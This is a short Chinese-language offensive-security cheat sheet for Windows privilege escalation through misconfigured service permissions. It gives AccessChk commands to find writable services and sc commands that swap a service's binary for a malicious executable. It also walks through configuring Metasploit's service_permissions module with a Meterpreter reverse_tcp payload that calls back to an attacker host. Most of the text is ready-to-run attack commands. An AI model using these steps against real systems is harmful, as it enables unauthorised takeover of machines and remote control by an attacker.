# 不安全配置

手动:​上传 AccessChk 工具​（微软官方，免杀）
```
upload /path/to/accesschk.exe C:\\Windows\\Temp\\


C:\Windows\Temp\accesschk.exe /accepteula -uwcqv "Authenticated Users" *


sc config <服务名> binPath= "C:\恶意程序.exe"
sc stop <服务名>
sc start <服务名>
```

利用msf的攻击模块

---

```
exploit/windows/local/service_permissions 模块是针对 ​Windows 安全配置错误​ 的攻击模块，
而非利用系统内核或应用代码漏洞。它利用的是管理员在服务权限配置上的疏漏，
属于 ​权限配置不当（Misconfiguration）​​ 类漏洞的自动化利用工具


步骤1：获取基础会话（Meterpreter)

# 假设已获得低权限 Meterpreter 会话（Session 1）
sessions -i 1

步骤2：加载并配置模块

use exploit/windows/local/service_permissions
set SESSION 1                # 当前会话 ID
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST <攻击机IP>         # 监听地址
set LPORT <监听端口>         # 如 4444
set AGGRESSIVE true          # 尝试所有漏洞服务（推荐）[2](@ref)

```
